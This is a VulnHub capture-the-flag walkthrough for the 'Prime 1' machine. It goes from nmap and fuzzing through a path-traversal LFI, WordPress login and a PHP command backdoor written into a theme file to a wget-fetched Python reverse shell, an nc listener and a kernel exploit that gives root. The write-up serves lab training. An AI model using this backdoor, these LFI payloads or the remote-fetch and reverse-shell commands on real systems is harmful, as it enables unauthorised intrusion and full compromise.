# Prime 1 | VulnHub
https://www.vulnhub.com/entry/prime-1,358/

### 1. Scan
```bash
Nmap scan report for 192.168.34.137                                                                                                                                                   
Host is up, received arp-response (0.00063s latency).
Scanned at 2021-07-02 23:16:37 EDT for 16s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcSVb7n0rTb58TfCcHJgtutnZzqf0hl48jPxI+VHOyhiQIihkQVkshhc8LdnSUg2BRGZL+RFfNLan9Q6FY0D7T/7PMlggPtSLU80er3JJO+XMfO3NURgMtVtKS0m+nRbL9C/pKSgBewxIcPk7Y45aXjAo7tsSoJ3DZUDcaitfFbAlr+108VBSx/arOXbYtusI1E2OCj1v/VKgVA9N/FL/OHuloOZPs/hY0MoamQKy+XYNdyCtrvSeRmItf09YXhFJwfY9Tr/nk077J7cz3r3INP+AFrpKVjdUAtxNpb+zAJLMJY8WF7oRZ1B8Sdljsslkh8PPK8e6Z4/rlCaJYW0OX
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiCXK7fYpBhJbT1KsyJkcpdXc1+zrB9rHVxBPtvA9hwTF4R4dZCZI9IpMFrperU0wqI/8uGYF9mW8l3aOAhJqc=
|   256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKMh3392Cf8RmKX5UyT6C1yLIVbncwwUg1i2P7/ucKk
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 00:0C:29:8D:C2:51 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/2%OT=22%CT=1%CU=44612%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=60DFD6A5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%
OS:TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 144.601 days (since Mon Feb  8 07:51:03 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.63 ms 192.168.34.137

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  2 23:16:53 2021 -- 1 IP address (1 host up) scanned in 17.37 seconds
```
This is an Ubuntu machine running SSH and Apache.

### 2. Enumeration
Running dirsearch shows a /dev and /wordpress directory, and also image.php.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u http://192.168.34.137/ -x 403      

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-02_23-35-28.log

Target: http://192.168.34.137/

[23:35:28] Starting: 
[23:35:44] 200 -  131B  - /dev
[23:35:46] 200 -  147B  - /image.php                                                                  
[23:35:46] 200 -  136B  - /index.php    
[23:35:46] 200 -  136B  - /index.php/login/                                               
[23:35:47] 301 -  321B  - /javascript  ->  http://192.168.34.137/javascript/
[23:35:58] 200 -    3KB - /wordpress/wp-login.php
[23:35:58] 200 -   11KB - /wordpress/
```

There is some text waiting at /dev.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.137/dev
hello,

now you are at level 0 stage.

In real life pentesting we should use our tools to dig on a web very hard.

Happy hacking. 
```

The image.php file doesn't go anywhere. Looking at Wordpress, it is a basic default instance with the default first post by a user "victor". This gives a possible username to the machine. Not much else to see here though. Back to the drawing board.
  
Doing some more enumeration of the webpage finds secret.txt.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ gobuster dir -u http://192.168.34.137 -x txt,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.34.137
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/07/02 23:57:38 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 136]
/image.php            (Status: 200) [Size: 147]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.34.137/wordpress/]
/dev                  (Status: 200) [Size: 131]                                       
/javascript           (Status: 301) [Size: 321] [--> http://192.168.34.137/javascript/]
/secret.txt           (Status: 200) [Size: 412]                                        
/server-status        (Status: 403) [Size: 302]                                        
                                                                                       
===============================================================
2021/07/03 00:10:18 Finished
===============================================================
```

Read it:
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.137/secret.txt
Looks like you have got some secrets.

Ok I just want to do some help to you. 

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck 
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
 
//see the location.txt and you will get your next move//
```

This indicates fuzzing for php parameters is needed, probably with image.php.

### 2. Fuzz php parameters

Firstly attempt to fuzz image.php. That's gotta be it, right?
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ffuf -c -w /usr/share/wfuzz/wordlist/general/common.txt -u "http://192.168.34.137/image.php?FUZZ=test" -fs 147

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.34.137/image.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/wfuzz/wordlist/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 147
________________________________________________

:: Progress: [951/951] :: Job [1/1] :: 341 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Drat. Next try index.php.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ffuf -c -w /usr/share/wfuzz/wordlist/general/common.txt -u "http://192.168.34.137/index.php?FUZZ=test" -fs 136

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.34.137/index.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/wfuzz/wordlist/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 136
________________________________________________

file                    [Status: 200, Size: 206, Words: 15, Lines: 8]
:: Progress: [951/951] :: Job [1/1] :: 395 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

The file parameter is valid.

### 3. Exploit LFI
As was hinted, check out location.php though the file parameter.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.137/index.php\?file=location.txt          
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>

Do something better <br><br><br><br><br><br>ok well Now you reah at the exact parameter <br><br>Now dig some more for next one <br>use 'secrettier360' parameter on some other php page for more fun.
</html>
```

Since I only know one other PHP page, try this secrettier360 parameter out in the image.php file.

```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.137/image.php\?secrettier360=../../../../etc/passwd                    
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
</html>
```

The LFI now works to read files on the system. Additionally, see that the "saket" user has shown there is a password.txt file in their directory. Read this next.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.137/image.php\?secrettier360=../../../../home/saket/password.txt
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br>follow_the_ippsec
</html>
```

A password is shown as `follow_the_ippsec`.  

### 3. Use the password
The password doesn't work for saket or victor over SSH, but the credentials `victor:follow_the_ippsec` do provide access to the Wordpress admin panel.

### 4. Get a shell
Tried to upload a plugin using the seclists one, created as below.

```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ sudo zip ./plugin-shell.zip /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
  adding: usr/share/seclists/Web-Shells/WordPress/plugin-shell.php (deflated 58%)
                                                                                                                                                                                      
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ls -l plugin-shell.zip 
-rw-r--r-- 1 root root 1392 Jul  3 00:27 plugin-shell.zip
```

This failed. Looking at the files in the theme, there is another file, secret.php file, and this is writable (unlike everything else). Can write a PHP backdoor script into this file:
```php
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

Once saved, the page is accessed and I can now run commands. Accessing http://192.168.34.137/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=whoami returns `www-data`.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.137/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=whoami
<pre>www-data
</pre>
```

The following steps are now taken to get a shell. Firstly create a python reverse shell script, then download it into the server's /tmp with a request.
```
http://192.168.34.137/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=wget%20http://192.168.34.138/rev.py%20-O%20/tmp/rev.py
```

Then access the file with a listener running.
```
http://192.168.34.137/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=python%20/tmp/rev.py
```

The shell opens.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.137] 52910
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cd /
<ml/wordpress/wp-content/themes/twentynineteen$ cd /                         
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5. Enumerate from foothold
The Linux version 4.10.0-28 of Ubuntu 16.04.
```bash
www-data@ubuntu:/tmp$ uname -a
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```
Exploits for this kernal do exist, including one that specifies the OS. This is a good bet.  
URL: https://www.exploit-db.com/exploits/45010
```bash
┌──(kali㉿kali)-[]-[~/Desktop/CVE-2021-3156-main]
└─$ searchsploit linux 4.10.0-28 ubuntu
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Fre | linux/dos/43234.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege  | linux/local/45010.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace P | linux/local/41760.txt
-------------------------------------------------------------------- ---------------------------------
```

### 6. Escalate to root
Compile the exploit locally and run it.
```bash
www-data@ubuntu:/tmp$ wget http://192.168.34.138/exploit.c
--2021-07-02 22:21:55--  http://192.168.34.138/exploit.c
Connecting to 192.168.34.138:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13728 (13K) [text/x-csrc]
Saving to: 'exploit.c'

exploit.c           100%[===================>]  13.41K  --.-KB/s    in 0s      

2021-07-02 22:21:55 (40.1 MB/s) - 'exploit.c' saved [13728/13728]

www-data@ubuntu:/tmp$ gcc exploit.c -o exploit
www-data@ubuntu:/tmp$ ./exploit
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff9998b72c8300
[*] Leaking sock struct from ffff9998b6d90000
[*] Sock->sk_rcvtimeo at offset 592
[*] Cred structure at ffff9998b0eb2e40
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff9998b0eb2e40
[*] credentials patched, launching shell...
# whoami
root
```